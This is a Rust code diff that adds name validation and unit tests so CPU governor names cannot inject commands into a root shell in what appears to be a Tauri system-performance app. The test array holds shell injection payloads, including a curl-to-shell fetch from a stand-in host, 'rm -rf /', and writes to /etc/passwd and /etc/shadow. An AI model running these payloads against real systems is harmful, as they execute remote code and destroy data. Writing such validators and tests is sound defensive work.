@@ -60,9 +60,53 @@ pub fn get_cpu_info() -> ApiResponse<CpuInfo> {
     }
 }
 
+/// Governors the kernel reports as available on this machine.
+fn read_available_governors() -> Vec<String> {
+    fs::read_to_string("/sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors")
+        .unwrap_or_default()
+        .split_whitespace()
+        .map(String::from)
+        .collect()
+}
+
+/// Validate a governor name before it is interpolated into a script run as root.
+///
+/// Two independent layers: the name must be a plain lowercase identifier, AND the
+/// kernel must list it as available. The character whitelist is the load-bearing
+/// one — it holds even when sysfs can't be read, so an empty available-list can
+/// never widen what is accepted.
+fn validate_governor(governor: &str) -> Result<(), String> {
+    if governor.is_empty() || governor.len() > 32 {
+        return Err("Invalid governor name.".to_string());
+    }
+    if !governor.chars().all(|c| c.is_ascii_lowercase() || c == '_') {
+        return Err("Invalid governor name: only lowercase letters and underscores are allowed.".to_string());
+    }
+
+    let available = read_available_governors();
+    if !available.is_empty() && !available.iter().any(|g| g == governor) {
+        return Err(format!(
+            "Governor '{}' is not available on this system. Available: {}",
+            governor,
+            available.join(", ")
+        ));
+    }
+    Ok(())
+}
+
 #[tauri::command]
 pub async fn set_cpu_governor(governor: String) -> ApiResponse<String> {
     println!("[Performance] Setting CPU governor to: {}", governor);
+
+    // This value reaches a root shell below — validate before anything else.
+    if let Err(e) = validate_governor(&governor) {
+        println!("[Performance] ✗ Rejected governor: {}", e);
+        return ApiResponse {
+            success: false,
+            data: None,
+            error: Some(e),
+        };
+    }
 
     // Get number of CPUs
     let cpu_count = fs::read_dir("/sys/devices/system/cpu")
@@ -389,5 +433,59 @@ pub async fn set_turbo_boost(enabled: bool) -> ApiResponse<String> {
         success: false,
         data: None,
         error: Some("Failed to set turbo boost".to_string()),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn accepts_plain_governor_names() {
+        // Character-layer only; the availability layer is machine-dependent and
+        // is skipped when scaling_available_governors cannot be read.
+        for g in &["performance", "powersave", "schedutil", "conservative"] {
+            let result = validate_governor(g);
+            if let Err(e) = &result {
+                assert!(
+                    e.contains("not available"),
+                    "'{}' should pass the character check, got: {}",
+                    g,
+                    e
+                );
+            }
+        }
+    }
+
+    /// The value reaches a root shell via pkexec, so shell metacharacters must
+    /// never survive validation.
+    #[test]
+    fn rejects_shell_injection_payloads() {
+        let payloads = [
+            "performance; curl evil.sh | sh",
+            "performance && rm -rf /",
+            "performance\nrm -rf /",
+            "$(id)",
+            "`id`",
+            "performance > /etc/passwd",
+            "performance | tee /etc/shadow",
+            "../../etc/passwd",
+            "perf ormance",
+            "PERFORMANCE",
+            "governor2",
+            "",
+        ];
+        for p in &payloads {
+            assert!(
+                validate_governor(p).is_err(),
+                "expected {:?} to be rejected",
+                p
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_overlong_names() {
+        assert!(validate_governor(&"a".repeat(33)).is_err());
     }
 }
